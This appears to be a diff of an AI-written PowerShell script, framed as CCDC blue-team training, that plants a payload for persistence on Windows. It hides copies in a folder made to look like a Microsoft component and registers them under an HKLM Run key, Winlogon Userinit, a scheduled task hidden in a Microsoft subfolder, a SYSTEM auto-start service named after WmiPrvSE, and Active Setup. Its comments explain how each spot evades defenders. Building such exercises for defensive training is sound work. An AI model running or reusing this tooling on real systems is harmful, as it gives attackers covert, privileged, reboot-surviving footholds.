@@ -1,5 +1,5 @@
 # =============================================================================
-# CCDC Blue Team Training Script — Windows Multi-Location Persistence Planter
+# CCDC Blue Team Training Script  -  Windows Multi-Location Persistence Planter
 # =============================================================================
 # Claude Sonnet 4.6 High
 # "Now we need to go back to windows. I need a Windows powershell script to run
@@ -18,7 +18,7 @@ param(
     [string]$PayloadPath
 )
 
-# ── Colour helpers ────────────────────────────────────────────────────────────
+# -- Colour helpers ------------------------------------------------------------
 function Write-Info    { param($m) Write-Host "[*] $m" -ForegroundColor Cyan   }
 function Write-Success { param($m) Write-Host "[+] $m" -ForegroundColor Green  }
 function Write-Warn    { param($m) Write-Host "[!] $m" -ForegroundColor Yellow }
@@ -26,13 +26,13 @@ function Write-Err     { param($m) Write-Host "[-] $m" -ForegroundColor Red    }
 
 Write-Host ""
 Write-Warn  "================================================================"
-Write-Warn  " CCDC Blue Team Training — Windows Persistence Planter"
+Write-Warn  " CCDC Blue Team Training  -  Windows Persistence Planter"
 Write-Warn  "================================================================"
 Write-Host ""
 
 # THIS IS THE LOCATION OF THE PAYLOAD TO PLANT
 
-# ── Validate payload ──────────────────────────────────────────────────────────
+# -- Validate payload ----------------------------------------------------------
 if (-not (Test-Path $PayloadPath)) {
     Write-Err "Payload not found: $PayloadPath"
     Write-Err "Usage: .\Plant-Persistence.ps1 -PayloadPath C:\path\to\payload.ps1"
@@ -43,7 +43,7 @@ $PayloadContent = Get-Content -Path $PayloadPath -Raw
 Write-Info "Payload confirmed: $PayloadPath"
 Write-Host ""
 
-# ── Shared drop directory — hidden, looks like a Microsoft component ──────────
+# -- Shared drop directory  -  hidden, looks like a Microsoft component ----------
 # Using ProgramData because it is not visible to standard users and is
 # commonly used by legitimate software. The subfolder name mimics a real
 # Microsoft diagnostics path to blend in.
@@ -56,7 +56,7 @@ if (-not (Test-Path $DropDir)) {
 $dirObj = Get-Item $DropDir -Force
 $dirObj.Attributes = $dirObj.Attributes -bor [System.IO.FileAttributes]::Hidden
 
-# ── Helper: encode a ps1 file to base64 for use in registry/task arguments ───
+# -- Helper: encode a ps1 file to base64 for use in registry/task arguments ---
 function Get-EncodedCommand {
     param([string]$ScriptPath)
     $bytes = [System.Text.Encoding]::Unicode.GetBytes((Get-Content $ScriptPath -Raw))
@@ -64,12 +64,12 @@ function Get-EncodedCommand {
 }
 
 # =============================================================================
-# LOCATION 1 — HKLM Run Key (disguised as a Windows Update component)
+# LOCATION 1  -  HKLM Run Key (disguised as a Windows Update component)
 # -----------------------------------------------------------------------------
 # HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run values execute for ALL
 # users at logon. Attackers favour this because it survives reboots, is not
 # tied to a scheduled task, and many defenders only check the HKCU variant.
-# Disguised as "WUDFComponentHost" — close to the real "WUDFHost" service name.
+# Disguised as "WUDFComponentHost"  -  close to the real "WUDFHost" service name.
 # =============================================================================
 
 Write-Info "[1/5] Planting in HKLM Run registry key ..."
@@ -91,11 +91,11 @@ Write-Success "  Payload copy : $Reg1DropPath (hidden)"
 Write-Host ""
 
 # =============================================================================
-# LOCATION 2 — Winlogon Userinit key (deep registry, rarely checked)
+# LOCATION 2  -  Winlogon Userinit key (deep registry, rarely checked)
 # -----------------------------------------------------------------------------
 # HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
 # is a comma-separated list of programs launched by winlogon.exe after login.
-# Appending a payload here is a classic technique — Userinit.exe is always
+# Appending a payload here is a classic technique  -  Userinit.exe is always
 # present so a comma-appended extra binary looks like a formatting quirk.
 # This runs as the logged-in user's context (SYSTEM on auto-logon machines).
 # =============================================================================
@@ -123,7 +123,7 @@ Write-Success "  Payload copy : $Reg2DropPath (hidden)"
 Write-Host ""
 
 # =============================================================================
-# LOCATION 3 — Scheduled Task hidden in a Microsoft subfolder
+# LOCATION 3  -  Scheduled Task hidden in a Microsoft subfolder
 # -----------------------------------------------------------------------------
 # Task Scheduler allows tasks to be stored in arbitrary subfolders of the
 # task library. Defenders using schtasks /query or Get-ScheduledTask without
@@ -181,10 +181,10 @@ Write-Success "  Payload copy  : $Task3DropPath (hidden)"
 Write-Host ""
 
 # =============================================================================
-# LOCATION 4 — Windows Service (ImagePath registry hijack disguised as WMI)
+# LOCATION 4  -  Windows Service (ImagePath registry hijack disguised as WMI)
 # -----------------------------------------------------------------------------
 # Creates a real Windows service pointing to a cmd.exe /c powershell launcher.
-# Named "WmiPrvSE-Helper" — extremely close to the legitimate "WmiPrvSE.exe"
+# Named "WmiPrvSE-Helper"  -  extremely close to the legitimate "WmiPrvSE.exe"
 # (WMI Provider Host). The service is set to AUTO_START so it runs at boot
 # as SYSTEM without any user interaction. Services are often overlooked when
 # defenders focus on scheduled tasks and registry Run keys.
@@ -216,7 +216,7 @@ if ($existingSvc) {
 
 # sc.exe requires a space after each '=' and the binPath value must be quoted
 # when it contains spaces. Backtick line-continuation prepends whitespace before
-# each keyword which confuses sc.exe's parser — keep it on one line.
+# each keyword which confuses sc.exe's parser  -  keep it on one line.
 sc.exe create $Svc4Name binPath= "$Svc4BinPath" start= auto obj= LocalSystem | Out-Null
 
 sc.exe description $Svc4Name "$Svc4Desc" | Out-Null
@@ -232,11 +232,11 @@ Write-Success "  Payload copy   : $Svc4DropPath (hidden)"
 Write-Host ""
 
 # =============================================================================
-# LOCATION 5 — Active Setup registry key (per-user, runs ONCE per new logon)
+# LOCATION 5  -  Active Setup registry key (per-user, runs ONCE per new logon)
 # -----------------------------------------------------------------------------
 # HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\ is processed
 # by Windows Explorer at logon. Each subkey has a "StubPath" that runs if the
-# version number in HKCU is lower than in HKLM — i.e. on first logon for any
+# version number in HKCU is lower than in HKLM  -  i.e. on first logon for any
 # user, including new accounts. This is a rarely-audited autorun location that
 # persists across user profile changes and is invisible to most autoruns
 # checklists that focus on Run/RunOnce keys.
